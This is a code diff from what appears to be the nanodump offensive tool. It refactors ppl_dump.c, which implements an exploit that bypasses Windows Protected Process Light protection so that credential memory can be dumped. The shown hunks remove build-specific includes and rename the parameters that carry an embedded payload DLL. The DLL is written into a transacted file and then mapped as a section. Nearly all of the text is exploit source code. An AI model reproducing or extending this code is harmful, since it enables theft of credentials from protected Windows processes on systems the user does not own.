@@ -1,23 +1,8 @@
 #include "ppl/ppl_dump.h"
 
-#ifdef EXE
- #ifdef _WIN64
-  #include "nanodump_ppl_dll.x64.h"
- #else
-  #include "nanodump_ppl_dll.x86.h"
- #endif
-#endif
-
-#ifdef BOF
-#include "ppl_utils.c"
-#include "../utils.c"
-#include "../dinvoke.c"
-#include "../syscalls.c"
-#include "../token_priv.c"
-#include "../impersonate.c"
-#endif
-
 BOOL run_ppl_dump_exploit(
+    IN unsigned char nanodump_ppl_dump_dll[],
+    IN unsigned int nanodump_ppl_dump_dll_len,
     IN LPCSTR dump_path,
     IN BOOL use_valid_sig,
     IN BOOL duplicate_handle)
@@ -407,8 +392,8 @@ BOOL run_ppl_dump_exploit(
     pwszSectionName = pwszDosDeviceTargetPath;
 
     success = map_dll(
-        nanodump_ppl_dll,
-        nanodump_ppl_dll_len,
+        nanodump_ppl_dump_dll,
+        nanodump_ppl_dump_dll_len,
         pwszSectionName,
         &hDllSection,
         &hTransaction);
@@ -843,8 +828,8 @@ BOOL find_file_for_transaction(
 }
 
 BOOL write_payload_dll_transacted(
-    IN unsigned char nanodump_dll[],
-    IN unsigned int nanodump_dll_len,
+    IN unsigned char nanodump_ppl_dump_dll[],
+    IN unsigned int nanodump_ppl_dump_dll_len,
     OUT PHANDLE pdhFile,
     OUT PHANDLE phTransaction)
 {
@@ -891,7 +876,7 @@ BOOL write_payload_dll_transacted(
     // be big enough so that we can copy our payload into the transacted file.
     //
     success = find_file_for_transaction(
-        nanodump_dll_len,
+        nanodump_ppl_dump_dll_len,
         &pwszTargetFile);
     if (!success)
     {
@@ -950,8 +935,8 @@ BOOL write_payload_dll_transacted(
         NULL,
         NULL,
         &IoStatusBlock,
-        nanodump_dll,
-        nanodump_dll_len,
+        nanodump_ppl_dump_dll,
+        nanodump_ppl_dump_dll_len,
         NULL,
         NULL);
     if (!NT_SUCCESS(status))
@@ -960,7 +945,7 @@ BOOL write_payload_dll_transacted(
         goto end;
     }
 
-    DPRINT("Wrote 0x%x bytes of embedded payload DLL to transacted file %ls.", nanodump_dll_len, pwszTargetFile);
+    DPRINT("Wrote 0x%x bytes of embedded payload DLL to transacted file %ls.", nanodump_ppl_dump_dll_len, pwszTargetFile);
 
     *pdhFile = hTransactedFile;
     *phTransaction = hTransaction;
@@ -976,8 +961,8 @@ end:
 }
 
 BOOL map_dll(
-    IN unsigned char nanodump_dll[],
-    IN unsigned int nanodump_dll_len,
+    IN unsigned char nanodump_ppl_dump_dll[],
+    IN unsigned int nanodump_ppl_dump_dll_len,
     IN LPWSTR pwszSectionName,
     OUT PHANDLE phSection,
     OUT PHANDLE phTransaction)
@@ -992,8 +977,8 @@ BOOL map_dll(
     *phSection = NULL;
 
     success = write_payload_dll_transacted(
-        nanodump_dll,
-        nanodump_dll_len,
+        nanodump_ppl_dump_dll,
+        nanodump_ppl_dump_dll_len,
         &hDllTransacted,
         phTransaction);
     if (!success)
